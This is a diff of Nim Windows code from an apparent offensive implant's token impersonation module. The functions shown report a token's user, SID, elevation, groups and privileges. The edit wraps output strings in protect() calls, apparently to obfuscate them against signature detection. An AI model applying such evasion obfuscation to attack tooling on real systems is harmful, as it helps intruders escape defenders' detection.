@@ -1,7 +1,7 @@
 import winim/lean 
 import strformat
 import ../utils/io
-import ../../common/[types, utils]
+import ../../common/utils
 
 #[
     Token impersonation & manipulation 
@@ -176,7 +176,7 @@ proc getTokenGroups(hToken: HANDLE, apis: Apis = initApis()): string =
         groupCount = pGroups.GroupCount
         groups = cast[ptr UncheckedArray[SID_AND_ATTRIBUTES]](addr pGroups.Groups[0])
 
-    result &= fmt"Group memberships ({groupCount})" & "\n"
+    result &= protect("Group memberships (") & $groupCount & protect(")\n")
     for i, group in groups.toOpenArray(0, int(groupCount) - 1): 
         result &= fmt" - {sidToString(group.Sid, apis):<50} {sidToName(group.Sid)}" & "\n"
 
@@ -203,9 +203,9 @@ proc getTokenPrivileges(hToken: HANDLE, apis: Apis = initApis()): string =
         privCount = pPrivileges.PrivilegeCount
         privs = cast[ptr UncheckedArray[LUID_AND_ATTRIBUTES]](addr pPrivileges.Privileges[0])
 
-    result &= fmt"Privileges ({privCount})" & "\n"
+    result &= protect("Privileges (") & $privCount & protect(")\n")
     for i, priv in privs.toOpenArray(0, int(privCount) - 1):
-        let enabled = if priv.Attributes and SE_PRIVILEGE_ENABLED: "Enabled" else: "Disabled" 
+        let enabled = if priv.Attributes and SE_PRIVILEGE_ENABLED: protect("Enabled") else: protect("Disabled") 
         result &= fmt" - {privilegeToString(addr priv.Luid):<50} {enabled}" & "\n"
 
 
@@ -213,15 +213,15 @@ proc getTokenInfo*(hToken: HANDLE): string =
     let apis = initApis() 
 
     let (tokenId, tokenType) = getTokenStatistics(hToken, apis)
-    result &= fmt"TokenID:  0x{tokenId}" & "\n"
-    result &= fmt"Type:     {tokenType}" & "\n"
+    result &= protect("TokenID:  0x") & tokenId & "\n"
+    result &= protect("Type:     ") & tokenType & "\n"
  
     let (username, sid) = getTokenUser(hToken, apis)
-    result &= fmt"User:     {username}" & "\n"
-    result &= fmt"SID:      {sid}" & "\n"
+    result &= protect("User:     ") & username & "\n"
+    result &= protect("SID:      ") & sid & "\n"
     
     let isElevated = getTokenElevation(hToken, apis)
-    result &= fmt"Elevated: {$isElevated}" & "\n"
+    result &= protect("Elevated: ") & $isElevated & "\n"
 
     result &= getTokenGroups(hToken, apis)
     result &= getTokenPrivileges(hToken, apis)
